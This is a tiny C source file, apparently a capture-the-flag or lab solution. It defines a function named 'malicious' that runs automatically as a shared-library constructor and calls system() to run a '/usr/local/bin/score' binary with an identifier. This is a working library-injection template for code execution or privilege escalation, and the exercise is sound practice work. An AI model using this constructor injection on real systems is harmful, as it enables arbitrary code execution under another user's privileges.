#include <stdio.h>
#include <stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
//     system ("/usr/local/bin/score f40a75bc-1ce0-4c46-81e3-f0226a131cd4");
	system("/usr/local/bin/score f40a75bc-1ce0-4c46-81e3-f0226a131cd4");
}

